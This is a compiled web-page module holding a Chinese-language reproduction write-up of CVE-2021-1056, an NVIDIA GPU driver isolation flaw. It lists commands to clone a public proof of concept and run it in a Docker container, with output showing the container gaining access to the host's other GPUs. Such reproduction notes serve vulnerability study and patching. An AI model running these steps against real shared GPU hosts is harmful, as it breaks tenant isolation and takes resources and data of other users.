import{_ as p}from"./plugin-vue_export-helper-c27b6911.js";import{r as o,o as e,c as r,a as s,b as a,d as t,e as l}from"./app-58e4a7d6.js";const c={},k=s("h2",{id:"漏洞描述",tabindex:"-1"},[s("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),a(" 漏洞描述")],-1),i=s("p",null,[a("用于Linux的NVIDIA GPU显示驱动程序在内核模式层（"),s("code",null,"nvidia.ko"),a("）中包含一个漏洞，在该漏洞中，它没有完全遵守操作系统文件系统提供GPU设备级隔离的权限，这可能导致拒绝服务或信息泄露。")],-1),d=s("p",null,"参考阅读：",-1),u={href:"https://github.com/pokerfaceSad/CVE-2021-1056/blob/master/docs/QuickStart.md",target:"_blank",rel:"noopener noreferrer"},v=l(`<h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>NVIDIA GPU显示驱动程序
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>Dokcer版本: 19.03</p><div class="language-plain line-numbers-mode" data-ext="plain"><pre class="language-plain"><code>git clone https://github.com/pokerfaceSad/CVE-2021-1056.git
cd CVE-2021-1056
docker run --gpus 1 -v $PWD:/CVE-2021-1056 -it tensorflow/tensorflow:1.13.2-gpu bash
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>进入容器检查 GPU状态，只有一块GPU</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>In Container<span class="token comment"># nvidia-smi</span>
Sat Jan  <span class="token number">9</span> 07:21:03 <span class="token number">2021</span>       
+-----------------------------------------------------------------------------+
<span class="token operator">|</span> NVIDIA-SMI <span class="token number">450.51</span>.05    Driver Version: <span class="token number">450.51</span>.05    CUDA Version: <span class="token number">11.0</span>     <span class="token operator">|</span>
<span class="token operator">|</span>-------------------------------+----------------------+----------------------+
<span class="token operator">|</span> GPU  Name        Persistence-M<span class="token operator">|</span> Bus-Id        Disp.A <span class="token operator">|</span> Volatile Uncorr. ECC <span class="token operator">|</span>
<span class="token operator">|</span> Fan  Temp  Perf  Pwr:Usage/Cap<span class="token operator">|</span>         Memory-Usage <span class="token operator">|</span> GPU-Util  Compute M. <span class="token operator">|</span>
<span class="token operator">|</span>                               <span class="token operator">|</span>                      <span class="token operator">|</span>               MIG M. <span class="token operator">|</span>
<span class="token operator">|</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span><span class="token operator">+=</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span><span class="token operator">+=</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span><span class="token operator">|</span>
<span class="token operator">|</span>   <span class="token number">0</span>  Tesla V100-PCIE<span class="token punctuation">..</span>.  Off  <span class="token operator">|</span> 00000000:02:00.0 Off <span class="token operator">|</span>                    <span class="token number">0</span> <span class="token operator">|</span>
<span class="token operator">|</span> N/A   27C    P0    23W / 250W <span class="token operator">|</span>      0MiB / 32510MiB <span class="token operator">|</span>      <span class="token number">0</span>%      Default <span class="token operator">|</span>
<span class="token operator">|</span>                               <span class="token operator">|</span>                      <span class="token operator">|</span>                  N/A <span class="token operator">|</span>
+-------------------------------+----------------------+----------------------+

+-----------------------------------------------------------------------------+
<span class="token operator">|</span> Processes:                                                                  <span class="token operator">|</span>
<span class="token operator">|</span>  GPU   GI   CI        PID   Type   Process name                  GPU Memory <span class="token operator">|</span>
<span class="token operator">|</span>        ID   ID                                                   Usage      <span class="token operator">|</span>
<span class="token operator">|</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span><span class="token operator">|</span>
<span class="token operator">|</span>  No running processes found                                                 <span class="token operator">|</span>
+-----------------------------------------------------------------------------+
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>在容器中执行漏洞利用脚本，在最后的<code>nvidia-smi</code>的输出中可以看到宿主机所有GPU在容器中都已经可见了</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>In Container<span class="token comment"># bash /CVE-2021-1056/main.sh</span>
<span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> init GPU num: <span class="token number">1</span>
<span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> /dev/nvidia0 exists, skip
<span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> successfully get /dev/nvidia1
<span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> successfully get /dev/nvidia2
<span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> successfully get /dev/nvidia3
<span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> delete redundant /dev/nvidia4
<span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> get extra <span class="token number">3</span> GPU devices from <span class="token function">host</span>
<span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> current GPU num: <span class="token number">4</span>
<span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> <span class="token builtin class-name">exec</span> nvidia-smi:
Sat Jan  <span class="token number">9</span> 07:22:43 <span class="token number">2021</span>       
+-----------------------------------------------------------------------------+
<span class="token operator">|</span> NVIDIA-SMI <span class="token number">450.51</span>.05    Driver Version: <span class="token number">450.51</span>.05    CUDA Version: <span class="token number">11.0</span>     <span class="token operator">|</span>
<span class="token operator">|</span>-------------------------------+----------------------+----------------------+
<span class="token operator">|</span> GPU  Name        Persistence-M<span class="token operator">|</span> Bus-Id        Disp.A <span class="token operator">|</span> Volatile Uncorr. ECC <span class="token operator">|</span>
<span class="token operator">|</span> Fan  Temp  Perf  Pwr:Usage/Cap<span class="token operator">|</span>         Memory-Usage <span class="token operator">|</span> GPU-Util  Compute M. <span class="token operator">|</span>
<span class="token operator">|</span>                               <span class="token operator">|</span>                      <span class="token operator">|</span>               MIG M. <span class="token operator">|</span>
<span class="token operator">|</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span><span class="token operator">+=</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span><span class="token operator">+=</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span><span class="token operator">|</span>
<span class="token operator">|</span>   <span class="token number">0</span>  Tesla V100-PCIE<span class="token punctuation">..</span>.  Off  <span class="token operator">|</span> 00000000:02:00.0 Off <span class="token operator">|</span>                    <span class="token number">0</span> <span class="token operator">|</span>
<span class="token operator">|</span> N/A   27C    P0    23W / 250W <span class="token operator">|</span>      0MiB / 32510MiB <span class="token operator">|</span>      <span class="token number">0</span>%      Default <span class="token operator">|</span>
<span class="token operator">|</span>                               <span class="token operator">|</span>                      <span class="token operator">|</span>                  N/A <span class="token operator">|</span>
+-------------------------------+----------------------+----------------------+
<span class="token operator">|</span>   <span class="token number">1</span>  Tesla V100-PCIE<span class="token punctuation">..</span>.  Off  <span class="token operator">|</span> 00000000:03:00.0 Off <span class="token operator">|</span>                    <span class="token number">0</span> <span class="token operator">|</span>
<span class="token operator">|</span> N/A   30C    P0    25W / 250W <span class="token operator">|</span>      0MiB / 32510MiB <span class="token operator">|</span>      <span class="token number">0</span>%      Default <span class="token operator">|</span>
<span class="token operator">|</span>                               <span class="token operator">|</span>                      <span class="token operator">|</span>                  N/A <span class="token operator">|</span>
+-------------------------------+----------------------+----------------------+
<span class="token operator">|</span>   <span class="token number">2</span>  Tesla V100-PCIE<span class="token punctuation">..</span>.  Off  <span class="token operator">|</span> 00000000:82:00.0 Off <span class="token operator">|</span>                    <span class="token number">0</span> <span class="token operator">|</span>
<span class="token operator">|</span> N/A   29C    P0    25W / 250W <span class="token operator">|</span>      0MiB / 32510MiB <span class="token operator">|</span>      <span class="token number">0</span>%      Default <span class="token operator">|</span>
<span class="token operator">|</span>                               <span class="token operator">|</span>                      <span class="token operator">|</span>                  N/A <span class="token operator">|</span>
+-------------------------------+----------------------+----------------------+
<span class="token operator">|</span>   <span class="token number">3</span>  Tesla V100-PCIE<span class="token punctuation">..</span>.  Off  <span class="token operator">|</span> 00000000:83:00.0 Off <span class="token operator">|</span>                    <span class="token number">0</span> <span class="token operator">|</span>
<span class="token operator">|</span> N/A   28C    P0    25W / 250W <span class="token operator">|</span>      0MiB / 32510MiB <span class="token operator">|</span>      <span class="token number">0</span>%      Default <span class="token operator">|</span>
<span class="token operator">|</span>                               <span class="token operator">|</span>                      <span class="token operator">|</span>                  N/A <span class="token operator">|</span>
+-------------------------------+----------------------+----------------------+

+-----------------------------------------------------------------------------+
<span class="token operator">|</span> Processes:                                                                  <span class="token operator">|</span>
<span class="token operator">|</span>  GPU   GI   CI        PID   Type   Process name                  GPU Memory <span class="token operator">|</span>
<span class="token operator">|</span>        ID   ID                                                   Usage      <span class="token operator">|</span>
<span class="token operator">|</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span><span class="token operator">|</span>
<span class="token operator">|</span>  No running processes found                                                 <span class="token operator">|</span>
+-----------------------------------------------------------------------------+
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>为了验证这些GPU确实是可用的，执行一个tensorflow的demo，可以看到所有的GPU确实可以被容器中的进程使用</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>In Container<span class="token comment"># nohup python /CVE-2021-1056/tf_distr_demo.py &gt; log 2&gt;&amp;1 &amp;</span>
In Container$ nvidia-smi
Sat Jan  <span class="token number">9</span> <span class="token number">18</span>:58:23 <span class="token number">2021</span>       
+-----------------------------------------------------------------------------+
<span class="token operator">|</span> NVIDIA-SMI <span class="token number">450.51</span>.05    Driver Version: <span class="token number">450.51</span>.05    CUDA Version: <span class="token number">11.0</span>     <span class="token operator">|</span>
<span class="token operator">|</span>-------------------------------+----------------------+----------------------+
<span class="token operator">|</span> GPU  Name        Persistence-M<span class="token operator">|</span> Bus-Id        Disp.A <span class="token operator">|</span> Volatile Uncorr. ECC <span class="token operator">|</span>
<span class="token operator">|</span> Fan  Temp  Perf  Pwr:Usage/Cap<span class="token operator">|</span>         Memory-Usage <span class="token operator">|</span> GPU-Util  Compute M. <span class="token operator">|</span>
<span class="token operator">|</span>                               <span class="token operator">|</span>                      <span class="token operator">|</span>               MIG M. <span class="token operator">|</span>
<span class="token operator">|</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span><span class="token operator">+=</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span><span class="token operator">+=</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span><span class="token operator">|</span>
<span class="token operator">|</span>   <span class="token number">0</span>  Tesla V100-PCIE<span class="token punctuation">..</span>.  Off  <span class="token operator">|</span> 00000000:02:00.0 Off <span class="token operator">|</span>                    <span class="token number">0</span> <span class="token operator">|</span>
<span class="token operator">|</span> N/A   32C    P0    36W / 250W <span class="token operator">|</span>  31117MiB / 32510MiB <span class="token operator">|</span>      <span class="token number">1</span>%      Default <span class="token operator">|</span>
<span class="token operator">|</span>                               <span class="token operator">|</span>                      <span class="token operator">|</span>                  N/A <span class="token operator">|</span>
+-------------------------------+----------------------+----------------------+
<span class="token operator">|</span>   <span class="token number">1</span>  Tesla V100-PCIE<span class="token punctuation">..</span>.  Off  <span class="token operator">|</span> 00000000:03:00.0 Off <span class="token operator">|</span>                    <span class="token number">0</span> <span class="token operator">|</span>
<span class="token operator">|</span> N/A   33C    P0    35W / 250W <span class="token operator">|</span>  31117MiB / 32510MiB <span class="token operator">|</span>      <span class="token number">1</span>%      Default <span class="token operator">|</span>
<span class="token operator">|</span>                               <span class="token operator">|</span>                      <span class="token operator">|</span>                  N/A <span class="token operator">|</span>
+-------------------------------+----------------------+----------------------+
<span class="token operator">|</span>   <span class="token number">2</span>  Tesla V100-PCIE<span class="token punctuation">..</span>.  Off  <span class="token operator">|</span> 00000000:82:00.0 Off <span class="token operator">|</span>                    <span class="token number">0</span> <span class="token operator">|</span>
<span class="token operator">|</span> N/A   33C    P0    36W / 250W <span class="token operator">|</span>  31117MiB / 32510MiB <span class="token operator">|</span>      <span class="token number">1</span>%      Default <span class="token operator">|</span>
<span class="token operator">|</span>                               <span class="token operator">|</span>                      <span class="token operator">|</span>                  N/A <span class="token operator">|</span>
+-------------------------------+----------------------+----------------------+
<span class="token operator">|</span>   <span class="token number">3</span>  Tesla V100-PCIE<span class="token punctuation">..</span>.  Off  <span class="token operator">|</span> 00000000:83:00.0 Off <span class="token operator">|</span>                    <span class="token number">0</span> <span class="token operator">|</span>
<span class="token operator">|</span> N/A   32C    P0    37W / 250W <span class="token operator">|</span>  31117MiB / 32510MiB <span class="token operator">|</span>      <span class="token number">1</span>%      Default <span class="token operator">|</span>
<span class="token operator">|</span>                               <span class="token operator">|</span>                      <span class="token operator">|</span>                  N/A <span class="token operator">|</span>
+-------------------------------+----------------------+----------------------+

+-----------------------------------------------------------------------------+
<span class="token operator">|</span> Processes:                                                                  <span class="token operator">|</span>
<span class="token operator">|</span>  GPU   GI   CI        PID   Type   Process name                  GPU Memory <span class="token operator">|</span>
<span class="token operator">|</span>        ID   ID                                                   Usage      <span class="token operator">|</span>
<span class="token operator">|</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span><span class="token operator">|</span>
+-----------------------------------------------------------------------------+
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,12);function m(b,f){const n=o("ExternalLinkIcon");return e(),r("div",null,[k,i,d,s("ul",null,[s("li",null,[s("a",u,[a("https://github.com/pokerfaceSad/CVE-2021-1056/blob/master/docs/QuickStart.md"),t(n)])])]),v])}const I=p(c,[["render",m],["__file","NVIDIA GPU显示驱动程序 信息泄露 CVE-2021-1056.html.vue"]]);export{I as default};
